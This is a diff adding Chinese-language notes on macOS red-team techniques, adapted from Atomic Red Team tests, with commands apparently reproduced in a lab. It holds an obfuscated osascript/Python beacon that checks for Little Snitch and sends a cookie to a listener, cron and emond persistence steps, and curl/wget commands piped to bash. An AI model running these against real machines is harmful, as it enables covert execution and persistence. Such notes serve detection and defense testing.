@@ -391,3 +391,188 @@ msxsl.exe http://snappyzz.com/msxslxmlfile.xml http://snappyzz.com/msxslscript.x
 win10成功复现(关闭病毒防护)
 
 剩下两个没有复现成功
+
+## macos
+
+### T1059.002 - AppleScript
+
+红队可以通过osascript来执行AppleScript或者任何OSA脚本，虽然执行的是脚本语言，但是可通过该进程拉起python进行shell反向连接，运行实例在如下演示
+
+**Demo1**
+
+首先在本地对80端口进行监听`nc -l 80`
+
+然后运行如下命令
+
+```
+osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\""
+```
+
+该脚本拉起python，对base64编码字段进行解密，向本地80端口发送数据，解密后的python脚本如下
+
+```python
+import sys;import re, subprocess;cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
+ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+out = ps.stdout.read()
+ps.stdout.close()
+if re.search("Little Snitch", out):
+   sys.exit()
+import urllib2;
+UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://127.0.0.1:80';t='/login/process.php';req=urllib2.Request(server+t);
+req.add_header('User-Agent',UA);
+req.add_header('Cookie',"session=t3VhVOs/DyCcDTFzIKanRxkvk3I=");
+proxy = urllib2.ProxyHandler();
+o = urllib2.build_opener(proxy);
+urllib2.install_opener(o);
+a=urllib2.urlopen(req,timeout=3).read();
+
+```
+
+该demo判断了系统是否运行了特定的进程，并发送了加密数据t3VhVOs/DyCcDTFzIKanRxkvk3I=
+
+查看监听端口，数据成功发送
+
+```
+snappyjack@snappyjackdeMacBook-Pro ~ % nc -l 80
+GET /login/process.php HTTP/1.1
+Accept-Encoding: identity
+Host: 127.0.0.1:80
+Cookie: session=t3VhVOs/DyCcDTFzIKanRxkvk3I=
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+```
+
+
+
+### T1053.003 - Cron
+
+红队可以利用cron来进行任务调度，执行恶意代码。cron是类Unix系统基于时间的调度工具集。crontab文件包含了任务调度的实体。红队通常使用cron来进行持久化、程序执行或者是横向移动。
+
+**Demo1 替换cron指向的文件**
+
+这个demo替换了用户的crontab文件，这项技术应用在多个IOT自动化攻击中
+
+```
+crontab -l > /tmp/notevil
+echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
+```
+
+**Demo2 在cron的文件夹中添加任务**
+
+这个demo在cron文件夹中配置调度任务，demo如下
+
+```
+echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/#persistevil
+```
+
+
+
+## T1569.001 - Launchctl
+
+
+
+Launchctl控制着macOS进程的启动，红队可以使用launchctl来运行程序。Launchctl支持自命令，交互命令和输入重定向。
+
+通过Launchctl运行进程如下：``launchctl submit -l  -- /Path/to/thing/to/execute "arg" "arg" "arg"``，红队可以使用这个方法进行exection甚至绕过一些应用的控制。Demo如下
+
+```
+launchctl submit -l label_name -- /System/Applications/Calculator.app/Contents/MacOS/Calculator
+```
+
+清除命令
+
+```
+launchctl remove label_name
+```
+
+
+
+## T1053.004 - Launchd
+
+红队可以使用Launchd来调度或者运行恶意代码.其中launchd守护进程的作用就是加载和维持系统的服务，该进程加载的plist参数分别来自`/System/Library/LaunchDaemons` 和 `/Library/LaunchDaemons` 
+
+红队可以使用macos中的launchd来调度启动文件夹下的可执行文件用来进行持久化，launchd也可以指定特定的用户运行程序
+
+**Demo1 创建事件监听守护进程（Event Monitor Daemon）来持久化**
+
+这个Demo通过修改plist来实现持久化
+
+```
+sudo cp a.plist /etc/emond.d/rules/atomicredteam_T1053_004.plist
+sudo touch /private/var/db/emondClients/randon  #Random name of the empty file used to trigger emond service
+```
+
+其中a.plist内容如下
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<array>
+    <dict>
+        <key>name</key>
+        <string>com.atomicredteam.t1053_004</string>
+        <key>enabled</key>
+        <true/>
+        <key>eventTypes</key>
+        <array>
+            <string>startup</string>
+        </array>
+        <key>actions</key>
+        <array>
+            <dict>
+                <key>command</key>
+                <string>/usr/bin/sleep</string>
+                <key>user</key>
+                <string>root</string>
+                <key>arguments</key>
+                    <array>
+                        <string>10</string>
+                    </array>
+                <key>type</key>
+                <string>RunCommand</string>
+            </dict>
+            <dict>
+                <key>command</key>
+                <string>/usr/bin/touch</string>
+                <key>user</key>
+                <string>root</string>
+                <key>arguments</key>
+                    <array>
+                        <string>/tmp/T1053_004_atomicredteam</string>
+                    </array>
+                <key>type</key>
+                <string>RunCommand</string>
+            </dict>
+        </array>
+    </dict>
+</array>
+</plist>
+```
+
+
+
+## T1059.004 - Unix Shell
+
+红队可使用unix shell来进行execute
+
+**Demo1 直接运行unix shell**
+
+```
+sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
+sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"
+chmod +x #{script_path}
+sh #{script_path}
+```
+
+**Demo2 通过其他进程拉起unix shell**
+
+```
+curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-redteam/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-redteam/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+```
+
+
+
+> 参考：https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/macos-matrix.md
+
